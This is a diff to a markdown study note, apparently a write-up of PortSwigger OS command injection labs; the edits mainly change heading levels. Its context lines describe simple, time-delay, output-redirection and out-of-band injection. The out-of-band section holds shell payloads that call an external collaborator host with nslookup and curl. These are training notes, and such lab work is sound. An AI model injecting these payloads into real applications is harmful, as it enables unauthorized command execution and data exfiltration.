@@ -43,7 +43,7 @@ categories:
 
   `Process.Start(), System.Diagnostics.Process,etc...`
 
-### Example : Injecting via Perl
+## Example : Injecting via Perl
 
   ```perl
   #!/usr/bin/perl
@@ -82,7 +82,7 @@ categories:
   
   `Dafydd Stuttard, Marcus Pinto - The web application hacker's handbook_ finding and exploiting security flaws-Wiley (2011)`
 
-# Lab: OS command injection, simple case
+### Lab: OS command injection, simple case
   
   This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user‑supplied product and store IDs, then returns the output.
 
@@ -108,7 +108,7 @@ categories:
 
   The response contains the output of whoami appended to the stock information.
 
-# Lab: Blind OS command injection with time delays
+### Lab: Blind OS command injection with time delays
   
   This lab contains a blind OS command injection vulnerability in the feedback submission function. 
   
@@ -126,7 +126,7 @@ categories:
 
   We can see it works on email field input by delaying 10 seconds.
 
-# Lab: Blind OS command injection with output redirection
+### Lab: Blind OS command injection with output redirection
 
   This lab contains a blind OS command injection vulnerability. The application does not return output, but you can redirect command output to a file in a web‑accessible location, then retrieve it.
 
@@ -164,7 +164,7 @@ categories:
 
   `https://0a4300a40460df418015fd1f001d0097.web-security-academy.net/image?filename=output.txt`
 
-# Lab: Blind OS command injection with out-of-band interaction
+### Lab: Blind OS command injection with out-of-band interaction
   
   This lab contains a blind OS command injection vulnerability. The application does not return output and has no writable web root.
 
@@ -176,9 +176,13 @@ categories:
 
   Linux OOB payloads:
   
-  ` ; nslookup collaborator-id.burpcollaborator.net `
+  ```text 
+   ; nslookup collaborator-id.burpcollaborator.net 
+  ```
   
-  ` ; curl http://collaborator-id.burpcollaborator.net `
+  ```text 
+  ; curl http://collaborator-id.burpcollaborator.net 
+  ```
 
   Exploitation :
 
@@ -190,7 +194,7 @@ categories:
 
   We can see it is vulnerable in email parameter.
 
-# Lab: Blind OS command injection with out-of-band data exfiltration
+### Lab: Blind OS command injection with out-of-band data exfiltration
   
   This lab extends the previous one – you not only need OOB interaction but also must exfiltrate sensitive data (e.g., the 
 
